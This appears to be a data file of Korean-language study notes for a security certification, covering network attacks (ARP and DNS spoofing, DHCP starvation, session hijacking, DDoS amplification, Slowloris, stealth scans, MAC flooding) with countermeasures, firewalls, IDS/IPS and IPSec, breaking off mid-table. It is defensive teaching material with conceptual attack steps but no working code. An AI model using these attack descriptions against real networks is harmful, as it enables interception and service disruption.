<h4>ARP Spoofing (ARP Poisoning)</h4>
<p>공격자가 위조된 ARP Reply를 브로드캐스트하여 피해자의 ARP 캐시를 오염시킨다. 결과적으로 피해자의 트래픽이 공격자를 경유하게 된다 (MITM).</p>
<pre><code>공격자: "192.168.1.1의 MAC은 AA:BB:CC:DD:EE:FF (공격자 MAC)" 라고 ARP Reply 전송
피해자: ARP 캐시 갱신 → 게이트웨이 트래픽이 공격자로 전달</code></pre>
<h4>ARP Spoofing 대응</h4>
<ul>
  <li><strong>DAI (Dynamic ARP Inspection)</strong>: 스위치에서 DHCP Snooping 바인딩 테이블과 비교하여 위조 ARP 차단</li>
  <li><strong>Static ARP</strong>: 중요 호스트 ARP 항목을 정적으로 고정</li>
  <li><strong>ARPWatch</strong>: ARP 캐시 변경 감지 및 경보</li>
  <li><strong>암호화</strong>: MITM 성공 시에도 내용 보호 (TLS/HTTPS)</li>
</ul>

<h3>ICMP 취약점</h3>
<table>
  <thead><tr><th>공격</th><th>원리</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td>ICMP Redirect</td><td>공격자가 위조된 ICMP Redirect로 라우팅 경로 변경 → 트래픽 우회</td><td>ICMP Redirect 수신 비활성화</td></tr>
    <tr><td>Smurf 공격</td><td>출발지 IP를 피해자로 위조한 ICMP Echo Request를 브로드캐스트 주소로 전송 → 네트워크 내 모든 호스트가 피해자에게 Echo Reply 전송 → 증폭 DDoS</td><td>Directed Broadcast 차단, IP Spoofing 방지</td></tr>
    <tr><td>Ping of Death</td><td>65,535 byte 초과 분할 ICMP 패킷 전송 → 재조합 시 버퍼 오버플로우</td><td>패치, 크기 제한</td></tr>
    <tr><td>ICMP Tunneling</td><td>ICMP 패이로드에 데이터 은닉 → 방화벽 우회</td><td>ICMP 페이로드 검사, DPI</td></tr>
  </tbody>
</table>

<h3>DNS 취약점</h3>

<h4>DNS Spoofing (Cache Poisoning)</h4>
<p>DNS 서버의 캐시에 위조된 레코드를 주입하여 사용자를 악성 사이트로 유도.</p>
<ul>
  <li><strong>Kaminsky Attack (2008)</strong>: UDP 포트와 Transaction ID를 무차별 대입하여 권한 DNS 서버 캐시 오염. DNS의 구조적 취약점을 이용.</li>
  <li><strong>대응</strong>: DNSSEC (응답에 디지털 서명), 포트 랜덤화, Transaction ID 랜덤화, DNS over HTTPS (DoH), DNS over TLS (DoT)</li>
</ul>

<h4>DNS Amplification (증폭 공격)</h4>
<p>출발지 IP를 피해자로 위조한 DNS 요청을 오픈 리졸버에 전송. 응답이 피해자에게 집중 (증폭 배율 최대 70배). DRDoS 기법.</p>
<ul>
  <li>대응: 오픈 리졸버 차단, 응답 속도 제한 (RRL), BCP38 (Ingress Filtering)</li>
</ul>

<h3>DHCP 취약점</h3>
<table>
  <thead><tr><th>공격</th><th>원리</th><th>대응</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>DHCP Starvation</strong></td>
      <td>위조된 MAC 주소로 다수의 DHCP 요청 → IP 풀 고갈 → 신규 단말 IP 할당 불가 (DoS)</td>
      <td>DHCP Snooping, 포트당 MAC 수 제한 (Port Security)</td>
    </tr>
    <tr>
      <td><strong>DHCP Spoofing</strong></td>
      <td>Starvation 후 가짜 DHCP 서버 구동 → 악성 게이트웨이·DNS 할당 → MITM</td>
      <td>DHCP Snooping (Trusted/Untrusted 포트 설정)</td>
    </tr>
  </tbody>
</table>

<h3>IP Spoofing</h3>
<p>출발지 IP 주소를 위조한 패킷 전송. TCP는 3-way handshake로 제한되지만 UDP/ICMP는 자유롭게 위조 가능. Smurf·DRDoS·SYN Flood 등에 활용.</p>
<ul>
  <li><strong>Ingress Filtering (BCP38)</strong>: ISP 경계 라우터에서 내부 IP 범위가 아닌 출발지 IP 차단</li>
  <li><strong>uRPF (Unicast Reverse Path Forwarding)</strong>: 패킷 수신 인터페이스가 라우팅 테이블상 해당 출발지 IP의 최적 경로와 일치하지 않으면 차단</li>
</ul>

<h3>세션 하이재킹 (Session Hijacking)</h3>
<p>합법적으로 수립된 TCP 세션을 탈취하는 공격. TCP 시퀀스 번호 예측이 핵심.</p>
<ol>
  <li>ARP Spoofing 등으로 피해자 패킷 확보</li>
  <li>TCP 시퀀스 번호(SEQ)와 확인 번호(ACK) 파악</li>
  <li>피해자보다 먼저 올바른 시퀀스 번호의 패킷 전송</li>
  <li>서버가 공격자를 합법적 클라이언트로 인식</li>
</ol>
<p><strong>대응</strong>: 암호화(TLS), 시퀀스 번호 랜덤화, 세션 토큰, IP+포트 고정 검증</p>

<h3>라우팅 프로토콜 취약점</h3>
<table>
  <thead><tr><th>프로토콜</th><th>취약점</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td>BGP</td><td>Route Hijacking: 위조된 BGP 공고로 트래픽 우회. 2008년 파키스탄 텔레콤 YouTube 차단 사건.</td><td>RPKI (Route Origin Validation), BGPsec</td></tr>
    <tr><td>OSPF</td><td>위조된 LSA (Link State Advertisement)로 라우팅 테이블 오염</td><td>OSPF 인증 (MD5/SHA), 패시브 인터페이스</td></tr>
    <tr><td>RIP</td><td>위조된 RIP 응답으로 라우팅 루프 유발</td><td>RIPv2 인증, 스플릿 호라이즌</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'network-attack-dos',
    chapterLabel: 'DoS·DDoS 공격',
    keywords: ['DoS', 'DDoS', 'SYN Flooding', 'ICMP Flooding', 'UDP Flooding', 'Ping of Death', 'Teardrop', 'Land Attack', 'Smurf', 'HTTP Flood', 'Slowloris', 'Amplification', 'Botnet', 'C&C', '반사 공격', 'DRDoS'],
    content: `

<h3>DoS vs DDoS</h3>
<table>
  <thead><tr><th>구분</th><th>DoS (Denial of Service)</th><th>DDoS (Distributed DoS)</th></tr></thead>
  <tbody>
    <tr><td>공격 주체</td><td>단일 시스템</td><td>다수의 분산된 시스템 (봇넷)</td></tr>
    <tr><td>공격 규모</td><td>소규모</td><td>대규모 (수백 Gbps 이상)</td></tr>
    <tr><td>추적 난이도</td><td>상대적으로 쉬움</td><td>어려움</td></tr>
    <tr><td>방어 난이도</td><td>상대적으로 쉬움</td><td>어려움</td></tr>
  </tbody>
</table>

<h3>볼류메트릭 공격 (Volumetric Attack)</h3>
<p>대역폭을 포화시켜 정상 트래픽 차단. 단위: bps, pps.</p>
<table>
  <thead><tr><th>공격</th><th>원리</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>SYN Flood</strong></td><td>다수의 위조된 SYN 전송 → 서버가 SYN_RCVD 상태 큐 소진</td><td>TCP 3-way handshake 미완료, 서버 자원 고갈</td></tr>
    <tr><td><strong>UDP Flood</strong></td><td>대량 UDP 패킷으로 대역폭 포화</td><td>비연결형이라 위조 용이</td></tr>
    <tr><td><strong>ICMP Flood</strong></td><td>대량 Ping으로 대역폭 포화</td><td>단순하지만 방화벽으로 차단 쉬움</td></tr>
    <tr><td><strong>Amplification/Reflection</strong></td><td>위조 출발지 IP로 오픈 서버(DNS, NTP, SSDP)에 요청 → 피해자에게 증폭된 응답 전달</td><td>DNS는 최대 70배, NTP monlist는 최대 556배 증폭</td></tr>
  </tbody>
</table>

<h3>프로토콜 공격</h3>
<table>
  <thead><tr><th>공격</th><th>원리</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td><strong>Ping of Death</strong></td><td>65,535 byte 초과 ICMP 패킷을 분할 전송 → 재조합 시 버퍼 오버플로우</td><td>OS 패치, 크기 초과 패킷 차단</td></tr>
    <tr><td><strong>Teardrop</strong></td><td>IP 조각의 offset 값을 조작하여 중첩·누락된 분할 패킷 전송 → 재조합 시 시스템 크래시</td><td>OS 패치</td></tr>
    <tr><td><strong>Land Attack</strong></td><td>출발지 IP/포트 = 목적지 IP/포트로 SYN 전송 → 무한 루프</td><td>동일 출발지·목적지 패킷 차단</td></tr>
    <tr><td><strong>Smurf</strong></td><td>출발지를 피해자 IP로 위조 후 브로드캐스트 ICMP 전송 → 모든 호스트가 피해자에게 응답</td><td>Directed Broadcast 차단, BCP38</td></tr>
  </tbody>
</table>

<h3>애플리케이션 레이어 공격</h3>
<table>
  <thead><tr><th>공격</th><th>원리</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>HTTP Flood</strong></td><td>정상처럼 보이는 대량 HTTP GET/POST 요청으로 웹 서버 과부하</td><td>대역폭 소량, 탐지 어려움</td></tr>
    <tr><td><strong>Slowloris</strong></td><td>HTTP 헤더를 천천히 전송하여 연결을 오래 유지 → 최대 연결 수 소진</td><td>저대역폭으로 서버 마비 가능</td></tr>
    <tr><td><strong>RUDY (R-U-Dead-Yet)</strong></td><td>POST 요청 본문을 극도로 느리게 전송 → 서버 연결 유지</td><td>Slowloris의 POST 버전</td></tr>
    <tr><td><strong>ReDoS</strong></td><td>복잡한 정규표현식 취약점을 이용한 CPU 소진</td><td>애플리케이션 레이어</td></tr>
  </tbody>
</table>

<h3>DRDoS (Distributed Reflection DoS, 반사 서비스 거부)</h3>
<p>출발지 IP를 피해자로 위조하여 다수의 정상 서버(반사 서버)에 요청 전송 → 정상 서버들이 피해자에게 응답을 집중 전송.</p>
<ul>
  <li><strong>Amplification Factor</strong>: 요청 대비 응답 크기 비율. DNS(70배), NTP(556배), SSDP(30배), Chargen(358배)</li>
  <li><strong>특징</strong>: 공격자 IP 추적 불가, 정상 서버를 악용하므로 차단 어려움</li>
  <li><strong>대응</strong>: BCP38, 오픈 리졸버 차단, 응답 속도 제한</li>
</ul>

<h3>봇넷·C&C 구조</h3>
<table>
  <thead><tr><th>구분</th><th>중앙집중식 (Centralized)</th><th>P2P (분산)</th></tr></thead>
  <tbody>
    <tr><td>C&C 서버</td><td>단일 IRC/HTTP 서버</td><td>없음 (봇들이 직접 통신)</td></tr>
    <tr><td>제어</td><td>빠르고 단순</td><td>복잡</td></tr>
    <tr><td>탄력성</td><td>낮음 (C&C 차단 시 봇넷 무력화)</td><td>높음 (일부 봇 제거해도 유지)</td></tr>
    <tr><td>탐지</td><td>쉬움</td><td>어려움</td></tr>
  </tbody>
</table>

<h3>DDoS 대응 방법</h3>
<table>
  <thead><tr><th>방법</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>SYN Cookie</strong></td><td>SYN_RCVD 상태 없이 쿠키로 연결 추적. SYN Flood 대응.</td></tr>
    <tr><td><strong>BCP38 (Ingress Filtering)</strong></td><td>ISP 경계에서 위조 출발지 IP 차단. IP Spoofing 기반 공격 억제.</td></tr>
    <tr><td><strong>블랙홀 라우팅</strong></td><td>공격 트래픽을 null0 인터페이스로 라우팅. 빠르지만 정상 트래픽도 차단.</td></tr>
    <tr><td><strong>CDN / Anycast</strong></td><td>트래픽을 분산 노드로 분배. 공격 트래픽을 흡수.</td></tr>
    <tr><td><strong>스크러빙 센터</strong></td><td>공격 트래픽을 스크러빙 센터로 우회 → 정상 트래픽만 원본 서버로 전달.</td></tr>
    <tr><td><strong>Rate Limiting</strong></td><td>출발지 IP별 요청 속도 제한.</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'scanning-sniffing',
    chapterLabel: '스캐닝·스니핑',
    keywords: ['포트 스캔', 'Nmap', 'SYN 스캔', 'TCP Connect 스캔', 'UDP 스캔', 'FIN 스캔', 'NULL 스캔', 'XMAS 스캔', 'OS fingerprinting', '스니핑', '패킷 캡처', 'Wireshark', 'promiscuous mode', 'tcpdump', '네트워크 토폴로지'],
    content: `

<h3>포트 스캐닝 유형 비교</h3>
<table>
  <thead><tr><th>스캔 유형</th><th>전송 패킷</th><th>열린 포트 응답</th><th>닫힌 포트 응답</th><th>특징</th><th>탐지 여부</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>TCP Connect</strong></td>
      <td>SYN</td>
      <td>SYN+ACK → ACK (3-way 완료)</td>
      <td>RST+ACK</td>
      <td>완전한 연결. root 불필요.</td>
      <td>쉬움 (로그 남음)</td>
    </tr>
    <tr>
      <td><strong>SYN (Half-open)</strong></td>
      <td>SYN</td>
      <td>SYN+ACK → RST (연결 미완료)</td>
      <td>RST+ACK</td>
      <td>스텔스 스캔. root 필요. 가장 일반적.</td>
      <td>중간 (일부 로그)</td>
    </tr>
    <tr>
      <td><strong>UDP</strong></td>
      <td>UDP</td>
      <td>응답 없음</td>
      <td>ICMP Port Unreachable</td>
      <td>느림. UDP 서비스 탐지.</td>
      <td>어려움</td>
    </tr>
    <tr>
      <td><strong>FIN</strong></td>
      <td>FIN</td>
      <td>응답 없음</td>
      <td>RST</td>
      <td>Unix 계열만 동작. Windows는 닫힌 포트에도 RST.</td>
      <td>어려움</td>
    </tr>
    <tr>
      <td><strong>NULL</strong></td>
      <td>플래그 없음</td>
      <td>응답 없음</td>
      <td>RST</td>
      <td>RFC 793 기반. Unix 계열 전용.</td>
      <td>어려움</td>
    </tr>
    <tr>
      <td><strong>XMAS</strong></td>
      <td>FIN+PSH+URG</td>
      <td>응답 없음</td>
      <td>RST</td>
      <td>크리스마스 트리처럼 플래그 점등. Unix 계열 전용.</td>
      <td>어려움</td>
    </tr>
    <tr>
      <td><strong>Idle (Zombie)</strong></td>
      <td>제3자 IP 위조 SYN</td>
      <td>좀비 IP:SYN+ACK → 좀비 RST</td>
      <td>좀비 IP:RST → IPID 변화 없음</td>
      <td>완전 익명. IPID 변화량으로 결과 추론.</td>
      <td>매우 어려움</td>
    </tr>
  </tbody>
</table>

<h3>OS Fingerprinting</h3>
<table>
  <thead><tr><th>구분</th><th>Active Fingerprinting</th><th>Passive Fingerprinting</th></tr></thead>
  <tbody>
    <tr><td>방법</td><td>특수 패킷 전송 후 응답 분석 (TTL, Window Size, TCP 옵션 등)</td><td>정상 트래픽 분석 (네트워크 캡처)</td></tr>
    <tr><td>탐지</td><td>탐지 가능 (비정상 패킷)</td><td>탐지 어려움</td></tr>
    <tr><td>도구</td><td>Nmap (-O 옵션)</td><td>p0f</td></tr>
    <tr><td>분석 요소</td><td>TTL 기본값, TCP 윈도우 크기, DF 비트, IPID 패턴</td><td>동일</td></tr>
  </tbody>
</table>
<p>OS별 TTL 기본값: Windows = 128, Linux = 64, Cisco IOS = 255</p>

<h3>스니핑 (Sniffing)</h3>
<p>네트워크 인터페이스를 <strong>Promiscuous Mode</strong>로 설정하여 자신에게 향하지 않은 패킷도 수신·분석하는 기법. 도청, 자격증명 탈취, 트래픽 분석에 활용.</p>

<h4>허브 vs 스위치 환경</h4>
<table>
  <thead><tr><th>환경</th><th>특징</th><th>스니핑 용이성</th></tr></thead>
  <tbody>
    <tr><td>허브(Hub)</td><td>모든 포트에 브로드캐스트. 동일 세그먼트 모든 트래픽 수신 가능.</td><td>쉬움</td></tr>
    <tr><td>스위치(Switch)</td><td>MAC 테이블 기반 유니캐스트 전달. 대상 포트에만 전송.</td><td>어려움 (우회 기법 필요)</td></tr>
  </tbody>
</table>

<h4>스위치 환경 스니핑 우회 기법</h4>
<ul>
  <li><strong>ARP Spoofing</strong>: ARP 캐시를 오염시켜 트래픽을 공격자 경유. 가장 일반적.</li>
  <li><strong>MAC Flooding</strong>: 대량의 위조 MAC 주소로 스위치 CAM 테이블을 채워 허브처럼 동작하도록 강제 (Fail-open 모드).</li>
  <li><strong>Port Mirroring (SPAN)</strong>: 스위치 관리자가 트래픽 복사를 설정하는 합법적 방법. 공격자가 스위치 접근 시 악용 가능.</li>
</ul>

<h4>스니핑 대응</h4>
<ul>
  <li><strong>암호화</strong>: HTTPS, SSH, TLS 등으로 평문 전송 방지 (스니핑해도 내용 확인 불가)</li>
  <li><strong>스위치 사용</strong>: 허브 대신 스위치 사용으로 기본적 스니핑 방지</li>
  <li><strong>포트 보안 (Port Security)</strong>: 스위치 포트당 허용 MAC 주소 수 제한 → MAC Flooding 방지</li>
  <li><strong>DAI</strong>: ARP Spoofing 방지</li>
  <li><strong>IDS</strong>: 스니핑 도구 시그니처 탐지</li>
</ul>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'firewall',
    chapterLabel: '방화벽',
    keywords: ['방화벽', 'Firewall', '패킷 필터링', '상태 기반 검사', 'Stateful Inspection', '애플리케이션 게이트웨이', '서킷 게이트웨이', 'NGFW', 'WAF', 'DMZ', '스크리닝 라우터', '베스천 호스트', '듀얼홈드 게이트웨이', '트리플홈드'],
    content: `

<h3>방화벽 유형 비교</h3>
<table>
  <thead><tr><th>유형</th><th>동작 계층</th><th>특징</th><th>장점</th><th>단점</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>패킷 필터링</strong><br>(1세대)</td>
      <td>3~4계층</td>
      <td>IP 주소, 포트, 프로토콜 기반 ACL</td>
      <td>빠름, 저렴, 구현 단순</td>
      <td>상태 추적 불가, 분할 패킷·IP Spoofing 취약</td>
    </tr>
    <tr>
      <td><strong>상태 기반 검사</strong><br>(Stateful Inspection, 2세대)</td>
      <td>3~4계층</td>
      <td>연결 상태 테이블(State Table) 유지하여 맥락 기반 판단</td>
      <td>동적 패킷 분석, 세션 추적</td>
      <td>응용 계층 내용 미검사, 상태 테이블 메모리 소모</td>
    </tr>
    <tr>
      <td><strong>애플리케이션 게이트웨이</strong><br>(프록시 방화벽, 3세대)</td>
      <td>7계층</td>
      <td>각 프로토콜별 프록시가 내용까지 검사. 내부 IP 은닉.</td>
      <td>내용 기반 필터링, 강력한 로깅</td>
      <td>속도 느림, 모든 프로토콜 지원 불가, 단일 장애점</td>
    </tr>
    <tr>
      <td><strong>서킷 게이트웨이</strong><br>(Circuit-level Gateway)</td>
      <td>5계층 (세션)</td>
      <td>SOCKS 기반. TCP 연결 릴레이. 내용 미검사.</td>
      <td>애플리케이션 게이트웨이보다 빠름</td>
      <td>내용 검사 불가</td>
    </tr>
    <tr>
      <td><strong>NGFW</strong><br>(차세대 방화벽)</td>
      <td>7계층</td>
      <td>DPI, 앱 인식, SSL/TLS 검사, IPS, 사용자 ID 기반 정책</td>
      <td>복합 위협 통합 대응</td>
      <td>고가, 복잡, 처리 성능 소모</td>
    </tr>
  </tbody>
</table>

<h3>방화벽 아키텍처</h3>

<h4>스크리닝 라우터 (Screening Router)</h4>
<p>라우터에 패킷 필터링 ACL을 적용한 가장 단순한 구조. 단일 장애점. 저가.</p>
<pre><code>인터넷 -- [스크리닝 라우터(ACL)] -- 내부망</code></pre>

<h4>베스천 호스트 (Bastion Host)</h4>
<p>외부에서 접근 허용되는 강화된 호스트. 스크리닝 라우터 뒤에 배치. 프록시 서비스 운영. 침해 시 내부망 위협.</p>

<h4>듀얼홈드 게이트웨이 (Dual-homed Gateway)</h4>
<p>NIC 2개 (외부·내부 망 각각 연결). IP Forwarding 비활성화 → 직접 라우팅 불가. 모든 트래픽이 게이트웨이를 통과해야 함.</p>

<h4>스크리닝 서브넷 (Screened Subnet, DMZ 구조)</h4>
<p>외부 방화벽 + DMZ 구간 + 내부 방화벽의 3단 구조. 가장 안전한 구성.</p>
<pre><code>인터넷 -- [외부 방화벽] -- [DMZ: 웹서버, 메일서버, DNS] -- [내부 방화벽] -- 내부망</code></pre>

<h3>DMZ (비무장지대)</h3>
<p>외부 인터넷과 내부망 사이의 중간 영역. 외부 접근이 필요한 서버(웹·메일·DNS·FTP)를 배치하여 내부망 직접 노출 방지.</p>
<ul>
  <li>DMZ 서버가 침해되더라도 내부 방화벽이 내부망 보호</li>
  <li>내부망 서버는 외부에서 직접 접근 불가</li>
  <li>외부 방화벽: 인터넷 → DMZ 트래픽 제어</li>
  <li>내부 방화벽: DMZ → 내부망 트래픽 제어 (더 엄격)</li>
</ul>

<h3>NGFW (차세대 방화벽)</h3>
<ul>
  <li><strong>DPI (Deep Packet Inspection)</strong>: 패킷 내용까지 검사. 애플리케이션 식별.</li>
  <li><strong>애플리케이션 인식</strong>: 포트에 관계없이 실제 애플리케이션 식별 (예: P2P, 소셜 미디어)</li>
  <li><strong>사용자 ID 기반 정책</strong>: IP가 아닌 사용자 계정 기반 접근 제어. AD/LDAP 연동.</li>
  <li><strong>SSL/TLS 검사</strong>: 암호화 트래픽 복호화 후 검사 (SSL Inspection)</li>
</ul>

<h3>WAF (Web Application Firewall)</h3>
<p>HTTP/HTTPS 트래픽을 7계층에서 분석하여 웹 공격을 차단.</p>
<ul>
  <li>SQL Injection, XSS, CSRF, 파일 업로드, 디렉터리 트래버설 차단</li>
  <li>OWASP Top 10 기반 룰셋</li>
  <li>배치 방식: Reverse Proxy, Transparent Proxy, 스니핑</li>
  <li>일반 방화벽과 다른 점: HTTP 헤더·쿼리·본문까지 검사</li>
</ul>

<h3>방화벽 정책 원칙</h3>
<ul>
  <li><strong>Default Deny (화이트리스트)</strong>: 명시적으로 허용된 트래픽만 통과. 미정의 트래픽 차단. 권장 원칙.</li>
  <li><strong>Default Allow (블랙리스트)</strong>: 명시적으로 차단된 트래픽만 거부. 관리 편의성 높지만 보안 취약.</li>
  <li><strong>최소 권한 원칙</strong>: 업무에 필요한 최소한의 포트·프로토콜만 허용.</li>
  <li><strong>규칙 순서</strong>: 방화벽 정책은 위에서 아래로 순차 적용. 더 구체적인 규칙을 먼저 배치.</li>
</ul>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'ids-ips',
    chapterLabel: 'IDS·IPS·UTM',
    keywords: ['IDS', 'IPS', 'UTM', '침입탐지', '침입차단', '오탐', '미탐', 'False Positive', 'False Negative', 'NIDS', 'HIDS', '시그니처', '이상탐지', '행위기반', 'Snort', '허니팟', 'NAC'],
    content: `

<h3>IDS vs IPS 비교</h3>
<table>
  <thead><tr><th>구분</th><th>IDS (침입탐지시스템)</th><th>IPS (침입방지시스템)</th></tr></thead>
  <tbody>
    <tr><td>목적</td><td>탐지 및 경보</td><td>탐지 및 실시간 차단</td></tr>
    <tr><td>배치 방식</td><td>Out-of-band (미러링·TAP)</td><td>Inline (트래픽 경로에 직접 위치)</td></tr>
    <tr><td>트래픽 차단</td><td>불가 (경보만)</td><td>가능 (자동 차단)</td></tr>
    <tr><td>오탐(FP) 영향</td><td>불필요한 경보</td><td>정상 트래픽 차단 (서비스 장애)</td></tr>
    <tr><td>지연(Latency)</td><td>없음</td><td>검사로 인한 약간의 지연</td></tr>
    <tr><td>장애 시</td><td>탐지 불가 (네트워크 영향 없음)</td><td>네트워크 차단 위험 (Fail-open/Fail-close 설정 필요)</td></tr>
  </tbody>
</table>

<h3>NIDS vs HIDS 비교</h3>
<table>
  <thead><tr><th>구분</th><th>NIDS (네트워크 기반)</th><th>HIDS (호스트 기반)</th></tr></thead>
  <tbody>
    <tr><td>위치</td><td>네트워크 구간 (TAP/SPAN 포트)</td><td>개별 호스트에 에이전트 설치</td></tr>
    <tr><td>탐지 대상</td><td>네트워크 트래픽</td><td>로그, 시스템 콜, 파일 무결성, 레지스트리</td></tr>
    <tr><td>암호화 트래픽</td><td>탐지 어려움</td><td>복호화 후 분석 가능</td></tr>
    <tr><td>내부자 위협</td><td>탐지 어려움</td><td>탐지 가능</td></tr>
    <tr><td>성능 영향</td><td>호스트에 영향 없음</td><td>호스트 자원 소모</td></tr>
    <tr><td>관리</td><td>단일 지점에서 전체 모니터링</td><td>각 호스트 개별 관리</td></tr>
    <tr><td>예시</td><td>Snort, Suricata</td><td>OSSEC, Tripwire, Windows Defender</td></tr>
  </tbody>
</table>

<h3>탐지 방식 비교</h3>
<table>
  <thead><tr><th>방식</th><th>원리</th><th>장점</th><th>단점</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>시그니처(오용) 탐지</strong><br>Signature/Misuse Detection</td>
      <td>알려진 공격 패턴 DB와 비교</td>
      <td>정탐률 높음, 오탐률 낮음, 설명 가능</td>
      <td>신종·변종·제로데이 공격 탐지 불가, DB 업데이트 필요</td>
    </tr>
    <tr>
      <td><strong>이상(anomaly) 탐지</strong><br>Anomaly Detection</td>
      <td>정상 행위 프로파일 기준, 통계적 이상 탐지</td>
      <td>신종 공격 탐지 가능</td>
      <td>오탐률 높음, 프로파일 구축 어려움, 점진적 변화 탐지 불가</td>
    </tr>
    <tr>
      <td><strong>행위 기반 탐지</strong><br>Behavior-based Detection</td>
      <td>시스템 콜·API 호출 패턴 분석</td>
      <td>변형 악성코드 탐지</td>
      <td>복잡, 높은 오탐 가능성</td>
    </tr>
  </tbody>
</table>

<h3>탐지 판정: 오탐(FP) vs 미탐(FN)</h3>
<table>
  <thead><tr><th></th><th>실제 공격 (Positive)</th><th>정상 (Negative)</th></tr></thead>
  <tbody>
    <tr><td><strong>공격으로 탐지</strong></td><td>정탐 TP (True Positive)</td><td>오탐 FP (False Positive) — 불필요한 경보</td></tr>
    <tr><td><strong>정상으로 탐지</strong></td><td>미탐 FN (False Negative) — 보안 위협</td><td>정상 탐지 TN (True Negative)</td></tr>
  </tbody>
</table>
<ul>
  <li><strong>오탐(False Positive)</strong>: 정상 트래픽을 공격으로 오인. 임계값 낮출수록 증가. 운영 부담 증가.</li>
  <li><strong>미탐(False Negative)</strong>: 실제 공격을 정상으로 오인. 임계값 높일수록 증가. 보안 위협.</li>
  <li><strong>ROC 곡선</strong>: 탐지율(민감도)과 오탐률의 트레이드오프 관계를 표현. AUC가 높을수록 좋은 탐지기.</li>
</ul>

<h3>UTM (Unified Threat Management)</h3>
<p>방화벽 + IPS + 안티바이러스 + VPN + 콘텐츠 필터 + 스팸 필터를 단일 어플라이언스에 통합. 중소기업에 적합. 단일 장애점 주의.</p>

<h3>NAC (Network Access Control)</h3>
<p>네트워크 접속 전 단말의 보안 상태를 검사하여 정책 준수 단말만 접근 허용.</p>
<ul>
  <li><strong>802.1X</strong>: IEEE 표준 포트 기반 NAC. EAP 프로토콜로 인증. Supplicant(단말) + Authenticator(스위치) + Authentication Server(RADIUS).</li>
  <li><strong>에이전트 방식</strong>: 단말에 소프트웨어 에이전트 설치. 상세 검사 가능.</li>
  <li><strong>에이전트리스 방식</strong>: 에이전트 없이 네트워크 스캔. 배포 용이, 검사 제한.</li>
  <li>검사 항목: OS 패치 수준, 백신 설치·최신화, 개인 방화벽 활성화</li>
</ul>

<h3>허니팟 (Honeypot)</h3>
<p>공격자를 유인하기 위한 함정 시스템. 실제 서비스 없음. 공격 기법 수집·분석·지연 목적.</p>
<table>
  <thead><tr><th>구분</th><th>Low Interaction</th><th>High Interaction</th></tr></thead>
  <tbody>
    <tr><td>구현</td><td>가상 서비스 에뮬레이션</td><td>실제 OS·서비스 운영</td></tr>
    <tr><td>정보 수집</td><td>제한적</td><td>풍부 (실제 공격 행위 관찰)</td></tr>
    <tr><td>위험도</td><td>낮음</td><td>높음 (침해 시 피벗 포인트)</td></tr>
    <tr><td>예시</td><td>Honeyd</td><td>실제 서버에 가짜 데이터 배치</td></tr>
  </tbody>
</table>
<ul>
  <li><strong>허니넷(Honeynet)</strong>: 여러 허니팟을 네트워크로 구성. 더 현실적인 환경.</li>
  <li><strong>법적 주의</strong>: 공격자가 허니팟을 경유하여 제3자를 공격 시 법적 책임 문제 가능.</li>
</ul>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'ipsec-vpn',
    chapterLabel: 'IPSec·VPN',
    keywords: ['IPSec', 'VPN', 'AH', 'ESP', 'IKE', 'ISAKMP', 'SA', '터널 모드', '전송 모드', 'L2TP', 'PPTP', 'SSL VPN', 'GRE', '완전 순방향 비밀성', 'PFS'],
    content: `

<h3>VPN 유형 비교</h3>
<table>
  <thead><tr><th>유형</th><th>동작 계층</th><th>인증</th><th>암호화</th><th>용도</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>IPSec VPN</strong></td>
      <td>3계층 (네트워크)</td>
      <td>인증서, PSK</td>
      <td>AES, 3DES</td>
      <td>사이트 간 (LAN-to-LAN)</td>
    </tr>
    <tr>
      <td><strong>SSL VPN</strong></td>
      <td>4~7계층 (전송~응용)</td>
      <td>인증서, ID/PW, MFA</td>
      <td>TLS</td>
      <td>원격 접근 (클라이언트리스 가능)</td>
    </tr>
    <tr>
      <td><strong>L2TP/IPSec</strong></td>
      <td>2계층 (L2TP) + 3계층 (IPSec)</td>
      <td>PPP + IPSec</td>
      <td>IPSec ESP</td>
      <td>원격 접근 (Windows 기본 지원)</td>
    </tr>
    <tr>
      <td><strong>PPTP</strong></td>
      <td>2계층</td>
      <td>MS-CHAPv2 (취약)</td>
      <td>MPPE (취약)</td>
      <td>레거시 환경 (사용 금지 권고)</td>
    </tr>
    <tr>
      <td><strong>GRE</strong></td>
      <td>3계층</td>
      <td>없음</td>
      <td>없음 (IPSec과 조합)</td>
      <td>멀티캐스트·라우팅 프로토콜 터널링</td>
    </tr>
  </tbody>
</table>

<h3>IPSec 구성 요소</h3>

<h4>AH vs ESP 비교</h4>
<table>
  <thead><tr><th>항목</th><th>AH (Authentication Header)</th><th>ESP (Encapsulating Security Payload)</th></tr></thead>
  <tbody>
    <tr><td>프로토콜 번호</td><td>51</td><td>50</td></tr>
    <tr><td>인증</td><td>O (IP 헤더 포함 전체)</td><td>O (IP 헤더 제외)</td></tr>
    <tr><td>암호화</td><td>X</td><td>O</td></tr>
    <tr><td>무결성</td><td>O</td><td>O</td></tr>
    <tr><td>재전송 방지</td><td>O</td><td>O</td></tr>
    <tr><td>NAT 통과</td><td>불가 (IP 헤더 변경 시 인증 실패)</td><td>가능 (NAT-T: UDP 4500 캡슐화)</td></tr>
    <tr><td>기밀성</td><td>X</td><td>O</td></tr>
  </tbody>
</table>

<h4>IPSec 동작 모드</h4>
<table>
  <thead><tr><th>구분</th><th>전송 모드 (Transport Mode)</th><th>터널 모드 (Tunnel Mode)</th></tr></thead>
  <tbody>
    <tr><td>보호 범위</td><td>원본 IP 페이로드만 보호</td><td>원본 IP 패킷 전체 보호 (새 IP 헤더 추가)</td></tr>
